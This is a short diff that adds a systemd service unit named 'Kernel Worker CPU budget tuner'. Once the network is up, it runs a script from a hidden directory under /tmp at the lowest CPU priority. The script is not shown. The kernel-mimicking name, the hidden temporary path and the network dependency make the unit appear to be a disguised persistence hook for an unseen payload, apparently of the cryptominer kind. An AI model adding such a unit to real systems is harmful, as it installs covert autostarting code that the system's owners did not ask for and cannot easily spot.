@@ -1,0 +1,8 @@
+[Unit]
+Description=Kernel Worker CPU budget tuner
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/.sysd/tune.sh
+Nice=19
